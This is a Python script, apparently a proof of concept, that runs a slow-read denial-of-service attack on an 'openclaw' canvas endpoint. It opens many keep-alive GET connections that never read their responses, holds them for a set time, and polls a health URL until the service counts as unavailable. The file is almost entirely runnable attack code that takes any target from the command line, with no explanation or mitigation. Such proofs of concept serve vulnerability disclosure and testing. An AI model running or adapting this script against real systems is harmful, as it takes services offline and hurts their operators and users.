import socket
import sys
import time
import urllib.parse
import urllib.request

target = sys.argv[1].rstrip("/")
path = sys.argv[2] if len(sys.argv) > 2 else "/__openclaw__/canvas/big.bin"
concurrency = int(sys.argv[3]) if len(sys.argv) > 3 else 32
hold_seconds = int(sys.argv[4]) if len(sys.argv) > 4 else 90
health_url = sys.argv[5] if len(sys.argv) > 5 else ""

parsed = urllib.parse.urlparse(target)
host = parsed.hostname
port = parsed.port or (443 if parsed.scheme == "https" else 80)


def now():
    return time.strftime("%Y-%m-%d %H:%M:%S")


def open_slow_get(idx):
    sock = socket.create_connection((host, port), timeout=10)
    request = (
        f"GET {path}?slow={idx} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "User-Agent: openclaw-canvas-dos-poc\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
    ).encode()
    sock.sendall(request)
    print(f"[{now()}] slow_client={idx} connected request_sent read_paused=True", flush=True)
    return sock


def health_check():
    if not health_url:
        return True, "skipped"
    try:
        with urllib.request.urlopen(health_url, timeout=1) as resp:
            return 200 <= resp.status < 500, f"status={resp.status}"
    except Exception as exc:
        return False, repr(exc)


print(
    f"[{now()}] attack_start endpoint={target}{path} "
    f"mode=slow_read concurrency={concurrency} hold_seconds={hold_seconds}",
    flush=True,
)

sockets = []
try:
    for i in range(1, concurrency + 1):
        sockets.append(open_slow_get(i))
        time.sleep(0.03)

    fail_count = 0
    end_at = time.time() + hold_seconds
    while time.time() < end_at:
        ok, detail = health_check()
        if ok:
            print(f"[{now()}] health_check ok=True detail={detail}", flush=True)
        else:
            fail_count += 1
            print(f"[{now()}] health_check ok=False fail={fail_count} detail={detail}", flush=True)
        if fail_count >= 3:
            print(f"[{now()}] RESULT=UNAVAILABLE", flush=True)
            break
        time.sleep(1)
finally:
    for sock in sockets:
        try:
            sock.close()
        except Exception:
            pass
